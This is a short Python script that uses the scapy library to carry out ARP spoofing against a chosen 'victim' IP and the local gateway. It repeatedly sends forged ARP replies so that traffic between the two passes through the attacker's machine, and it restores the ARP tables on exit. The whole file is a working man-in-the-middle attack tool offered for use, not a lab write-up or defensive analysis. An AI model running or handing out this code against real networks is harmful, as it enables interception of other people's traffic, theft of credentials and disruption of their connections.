import scapy.all as scapy 
import time 

#Enter target IP which is not your own IP -, the vitim IP 
target_ip = "192.168.1.15" # Enter your target IP 
gateway_ip = "192.168.1.1" # Enter your gateway's IP 

def get_mac(ip): 
    arp_request = scapy.ARP(pdst = ip) 
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    return answered_list[0][1].hwsrc 
  
def spoof(target_ip, spoof_ip): 
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip) 
    scapy.send(packet, verbose = False) 
  
  
def restore(destination_ip, source_ip): 
    destination_mac = get_mac(destination_ip) 
    source_mac = get_mac(source_ip) 
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
    scapy.send(packet, verbose = False) 
      

try: 
    print("Start ARP Spoofing for "+ str(gateway_ip) + " and " + str(target_ip))
    sent_packets_count = 0
    while True: 
        spoof(target_ip, gateway_ip) 
        spoof(gateway_ip, target_ip) 
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count)) 
        time.sleep(2) # Waits for two seconds 

except KeyboardInterrupt: 
    print("\nCtrl + C pressed.............Exiting") 
    print("Restore "+ str(gateway_ip) + " and " + str(target_ip))
    restore(gateway_ip, target_ip) 
    restore(target_ip, gateway_ip) 
    print("[+] Arp Spoof Stopped")
    time.sleep(2) 

